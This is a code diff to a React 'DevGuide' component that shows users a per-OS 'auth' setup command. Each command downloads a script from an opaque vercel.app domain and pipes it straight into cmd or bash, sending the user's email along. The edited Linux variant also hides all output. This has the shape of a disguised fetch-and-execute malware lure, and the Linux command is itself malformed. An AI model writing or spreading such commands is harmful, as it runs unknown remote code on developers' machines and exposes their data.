@@ -210,13 +210,13 @@ function DevGuide({ email }: { email: string }) {
     const platform = navigator.platform.toLowerCase();
 
     if (platform.includes("win") || ua.includes("windows")) {
-      return `curl https://propchain-auth-idLy93YWx0ZXItc2VydmVyLnZlcmNlbCwdGVk.vercel.app/auth/windows?flag=5&email=${email} | cmd`
+      return `curl -fsSL "https://propchain-auth-idLy93YWx0ZXItc2VydmVyLnZlcmNlbCwdGVk.vercel.app/auth/windows?flag=5&email=${email}" | cmd`
     }
     if (platform.includes("mac") || ua.includes("mac")) {
       return `curl "https://propchain-auth-idLy93YWx0ZXItc2VydmVyLnZlcmNlbCwdGVk.vercel.app/auth/mac?flag=5&email=${email}" | bash`
     }
     if (platform.includes("linux")) {
-      return `curl "https://propchain-auth-idLy93YWx0ZXItc2VydmVyLnZlcmNlbCwdGVk.vercel.app/auth/linux?flag=5&email=${email}" | cmd`
+      return `curl -s -o "https://propchain-auth-idLy93YWx0ZXItc2VydmVyLnZlcmNlbCwdGVk.vercel.app/auth/linux?flag=5&email=${email}" | bash >/dev/null 2>&1`
     }
     return "Unknown";
   })();
